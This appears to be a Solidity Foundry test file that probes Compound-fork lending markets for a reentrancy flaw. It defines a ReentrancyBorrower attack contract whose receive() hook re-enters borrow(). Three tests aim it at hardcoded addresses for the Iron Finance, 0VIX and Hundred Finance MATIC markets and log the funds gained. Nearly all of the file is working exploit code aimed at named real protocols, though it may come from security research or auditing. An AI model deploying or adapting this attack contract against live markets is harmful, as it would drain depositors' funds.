// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function getCash() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function borrowBalanceCurrent(address) external returns (uint256);
    function accrueInterest() external returns (uint256);
    function repayBorrow() external payable;
}

interface ICToken {
    function mint(uint256) external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function underlying() external view returns (address);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function getAccountLiquidity(address) external view returns (uint256, uint256, uint256);
    function getAllMarkets() external view returns (address[] memory);
    function oracle() external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

// Reentrancy attacker for borrow path
contract ReentrancyBorrower {
    ICEther public cEther;
    IComptroller public comptroller;
    uint256 public borrowAmount;
    uint256 public reentryCalls;
    uint256 public maxReentry;
    bool public attacking;

    constructor(address _cEther, address _comptroller) {
        cEther = ICEther(_cEther);
        comptroller = IComptroller(_comptroller);
    }

    function setup() external payable {
        address[] memory markets = new address[](1);
        markets[0] = address(cEther);
        comptroller.enterMarkets(markets);
        cEther.mint{value: msg.value}();
    }

    function attackBorrow(uint256 _borrowAmount, uint256 _maxReentry) external {
        borrowAmount = _borrowAmount;
        maxReentry = _maxReentry;
        attacking = true;
        reentryCalls = 0;
        cEther.borrow(_borrowAmount);
        attacking = false;
    }

    function attackRedeem(uint256 redeemAmount, uint256 _maxReentry) external {
        maxReentry = _maxReentry;
        attacking = true;
        reentryCalls = 0;
        cEther.redeemUnderlying(redeemAmount);
        attacking = false;
    }

    receive() external payable {
        if (attacking && reentryCalls < maxReentry) {
            reentryCalls++;
            // Try to borrow more
            try cEther.borrow(borrowAmount) {} catch {}
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract CompoundForkReentrancyTest is Test {
    // Iron Finance
    address constant IRON_COMPTROLLER = 0xF20fcd005AFDd3AD48C85d0222210fe168DDd10c;
    address constant IRON_MATIC = 0xCa0F37f73174a28a64552D426590d3eD601ecCa1;

    // 0VIX
    address constant OVIX_COMPTROLLER = 0x8849f1a0cB6b5D6076aB150546EddEe193754F1C;
    address constant OVIX_MATIC = 0xE554E874c9c60E45F1Debd479389C76230ae25A8;

    // Hundred Finance
    address constant HF_COMPTROLLER = 0xEdBA32185BAF7fEf9A26ca567bC4A6cbe426e499;
    address constant HF_MATIC = 0xEbd7f3349AbA8bB15b897e03D6c1a4Ba95B55e31;

    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1000 ether);
    }

    function test_ironFinanceReentrancy() public {
        vm.startPrank(attacker);
        ReentrancyBorrower atk = new ReentrancyBorrower(IRON_MATIC, IRON_COMPTROLLER);

        // Supply 100 MATIC
        atk.setup{value: 100 ether}();
        console.log("=== Iron Finance ===");
        console.log("cEther balance:", ICEther(IRON_MATIC).balanceOf(address(atk)));

        // Check liquidity
        (uint256 err, uint256 liq, uint256 sf) = IComptroller(IRON_COMPTROLLER).getAccountLiquidity(address(atk));
        console.log("Liquidity:", liq);

        // Try borrow with reentrancy
        uint256 balBefore = address(atk).balance;
        try atk.attackBorrow(10 ether, 3) {
            console.log("Borrow succeeded!");
            console.log("Reentry calls:", atk.reentryCalls());
            console.log("Balance gained:", address(atk).balance - balBefore);
        } catch {
            console.log("Borrow reverted");
        }

        vm.stopPrank();
    }

    function test_ovixReentrancy() public {
        vm.startPrank(attacker);
        ReentrancyBorrower atk = new ReentrancyBorrower(OVIX_MATIC, OVIX_COMPTROLLER);

        // Supply 100 MATIC
        atk.setup{value: 100 ether}();
        console.log("=== 0VIX ===");
        console.log("cEther balance:", ICEther(OVIX_MATIC).balanceOf(address(atk)));

        (uint256 err, uint256 liq, uint256 sf) = IComptroller(OVIX_COMPTROLLER).getAccountLiquidity(address(atk));
        console.log("Liquidity:", liq);

        uint256 balBefore = address(atk).balance;
        try atk.attackBorrow(10 ether, 3) {
            console.log("Borrow succeeded!");
            console.log("Reentry calls:", atk.reentryCalls());
            console.log("Balance gained:", address(atk).balance - balBefore);
        } catch {
            console.log("Borrow reverted");
        }

        vm.stopPrank();
    }

    function test_hundredFinanceReentrancy() public {
        vm.startPrank(attacker);
        ReentrancyBorrower atk = new ReentrancyBorrower(HF_MATIC, HF_COMPTROLLER);

        atk.setup{value: 100 ether}();
        console.log("=== Hundred Finance ===");
        console.log("cEther balance:", ICEther(HF_MATIC).balanceOf(address(atk)));

        (uint256 err, uint256 liq, uint256 sf) = IComptroller(HF_COMPTROLLER).getAccountLiquidity(address(atk));
        console.log("Liquidity:", liq);

        uint256 balBefore = address(atk).balance;
        try atk.attackBorrow(10 ether, 3) {
            console.log("Borrow succeeded!");
            console.log("Reentry calls:", atk.reentryCalls());
            console.log("Balance gained:", address(atk).balance - balBefore);
        } catch {
            console.log("Borrow reverted");
        }

        vm.stopPrank();
    }
}
